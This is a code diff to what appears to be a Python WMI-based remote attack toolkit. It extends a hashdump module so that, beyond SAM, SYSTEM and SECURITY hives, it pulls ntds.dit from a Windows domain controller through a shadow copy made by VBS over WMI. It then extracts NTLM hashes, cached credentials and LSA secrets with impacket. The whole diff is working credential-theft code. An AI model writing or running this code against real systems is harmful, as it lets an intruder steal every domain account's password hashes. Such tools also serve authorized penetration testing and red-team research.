@@ -9,11 +9,11 @@ from lib.methods.executeVBS import executeVBS_Toolkit
 from lib.methods.classMethodEx import class_MethodEx
 
 from binascii import hexlify
-from impacket.examples.secretsdump import LocalOperations, SAMHashes, LSASecrets
+from impacket.examples.secretsdump import LocalOperations, SAMHashes, LSASecrets, NTDSHashes
 
 
 class Hashdump():
-    def __init__(self, iWbemLevel1Login):
+    def __init__(self, iWbemLevel1Login, dumpType):
         self.iWbemLevel1Login = iWbemLevel1Login
         self.executer = executeVBS_Toolkit(self.iWbemLevel1Login)
         self.hostname = self.iWbemLevel1Login._INTERFACE__target
@@ -27,10 +27,17 @@ class Hashdump():
         self.ShadowCopy_InstanceID = str(uuid.uuid4())
         self.iWbemServices_cimv2 = None
         self.iWbemServices_subscription = None
-        self.hashType = {
-            "SSS": ["sam", "system", "security"],
-            "NTDS": ["ntds.dit"]
-        }["SSS"]
+        self.dumpType = dumpType
+        self.creds_FilesInfo = {
+            "sss": {
+                "filename": ["sam", "system", "security"],
+                "directory": "\\windows\\system32\\config\\"
+            },
+            "ntds": {
+                "filename": ["ntds.dit", "system"],
+                "directory": "\\Windows\\NTDS\\"
+            }
+        }[self.dumpType]
 
     def hashdump(self):
         if not os.path.exists(self.save_Path):
@@ -56,13 +63,12 @@ class Hashdump():
         if not self._extract_file(kernel_object):
             return False
 
-        if not self._retrieve_file(self.hashType):
+        if not self._retrieve_file():
             return False
 
         self._parse_hashes()
 
         self._cleanup_shadow_copy(shadow_id)
-
 
     def _create_shadow_copy(self):
         try:
@@ -93,6 +99,8 @@ class Hashdump():
         vbs = vbs.replace("REPLACE_WITH_CLASSNAME", self.ClassName_StoreOutput)
         vbs = vbs.replace("RELEACE_WITH_UUID", self.ShadowCopy_InstanceID)
         vbs = vbs.replace("RELEACE_WITH_KERNELOBJECT", kernel_object)
+        vbs = vbs.replace("RELEACE_WITH_PATH", self.creds_FilesInfo["directory"])
+        vbs = vbs.replace("REPLACE_WITH_FILES", ', '.join(f'"{filename}"' for filename in self.creds_FilesInfo["filename"]))
         tag = self.executer.ExecuteVBS(vbs_content=vbs, returnTag=True, BlockVerbose=True, iWbemServices=self.iWbemServices_subscription)
 
         for i in range(self.remaining_Time_SS, 0, -1):
@@ -102,8 +110,8 @@ class Hashdump():
         self.executer.remove_Event(tag, BlockVerbose=True)
         return True
 
-    def _retrieve_file(self, filegroup):
-        for filename in filegroup:
+    def _retrieve_file(self):
+        for filename in self.creds_FilesInfo["filename"]:
             saved = os.path.join(self.save_Path, filename)
             try:
                 self.logger.info(f"Downloading {filename}")
@@ -125,26 +133,43 @@ class Hashdump():
         return True
 
     def _parse_hashes(self):
-        self.logger.info("Parsing hashes...")
         try:
             localOperations = LocalOperations(os.path.join(self.save_Path, "system"))
             bootKey = localOperations.getBootKey()
             self.logger.info(f"Boot key extracted successfully, bootkey: 0x{hexlify(bootKey).decode("ascii")}")
-            self.logger.info("Extracting password hashes from SAM...")
-            # NTDS
-            # localOperations.checkNoLMHashPolicy()
             
-            # Get SAM hashes
-            sam_hashes = SAMHashes(os.path.join(self.save_Path, "sam"), bootKey, isRemote=False, printUserStatus=True, perSecretCallback=lambda secret: self.logger.log(100, secret))
-            sam_hashes.dump()
+            if self.dumpType == "ntds":
+                ntds_hashes = NTDSHashes(
+                    os.path.join(self.save_Path, "ntds.dit"),
+                    bootKey,
+                    isRemote=False,
+                    history=False,
+                    noLMHash=localOperations.checkNoLMHashPolicy(),
+                    remoteOps=None,
+                    useVSSMethod=True,
+                    justNTLM=True,
+                    pwdLastSet=False,
+                    resumeSession=None,
+                    outputFileName=None,
+                    justUser=None,
+                    printUserStatus=True,
+                    perSecretCallback=lambda secretType, secret: self.logger.log(100, secret),
+                )
+                ntds_hashes.dump()
+                ntds_hashes.finish()
+            else:
+                # Get SAM hashes
+                self.logger.info("Extracting password hashes from SAM...")
+                sam_hashes = SAMHashes(os.path.join(self.save_Path, "sam"), bootKey, isRemote=False, printUserStatus=True, perSecretCallback=lambda secret: self.logger.log(100, secret))
+                sam_hashes.dump()
 
-            lsa_secrets = LSASecrets(os.path.join(self.save_Path, "security"), bootKey, isRemote=False, history=True, perSecretCallback=lambda secretType, secret: self.logger.log(100, secret))
-            lsa_secrets.dumpCachedHashes()
-            lsa_secrets.dumpSecrets()
+                lsa_secrets = LSASecrets(os.path.join(self.save_Path, "security"), bootKey, isRemote=False, history=True, perSecretCallback=lambda secretType, secret: self.logger.log(100, secret))
+                lsa_secrets.dumpCachedHashes()
+                lsa_secrets.dumpSecrets()
 
-            # Clean up
-            sam_hashes.finish()
-            lsa_secrets.finish()
+                # Clean up
+                sam_hashes.finish()
+                lsa_secrets.finish()
             
         except Exception as e:
             self.logger.error(f"Failed to parse hashes with impacket: {e}")
